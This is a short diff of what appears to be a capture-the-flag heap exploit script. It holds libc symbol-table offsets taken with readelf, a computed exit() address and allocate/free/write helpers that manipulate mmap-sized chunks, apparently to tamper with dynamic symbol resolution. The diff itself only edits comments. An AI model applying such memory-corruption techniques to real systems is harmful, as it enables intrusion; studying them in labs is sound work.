@@ -12,7 +12,7 @@ gnu_hash = elf_header_ptr + 0x00003930
 dynsym = elf_header_ptr + 0x00007660
 
 # readelf --dyn-sym /libc
-#exit_address = elf_header_ptr + 0x44be0
+# exit_address = elf_header_ptr + 0x44be0
 # root@df0ceb4b0d2e:/home/pwn# readelf --dyn-sym /lib/x86_64-linux-gnu/libc.so.6 | grep exit
 #   138: 0000000000044be0    32 FUNC    GLOBAL DEFAULT   16 exit@@GLIBC_2.2.5
 # entry #138, each entry is 6 4-byte ints
@@ -63,7 +63,6 @@ def write(idx, offset, content: bytes):
     print("Wrote to chunk:\n  idx: {}, offset: {}, content: {}".format(idx, offset, enhex(content)))
 
 mmap_size = 0xfffe8
-# allocate(1, mmap_size - 0x1000)
 free(1) # Just ensure that memset has been called/loaded.
 
 allocate(1, mmap_size) # e8 is max to get size of 0x101000
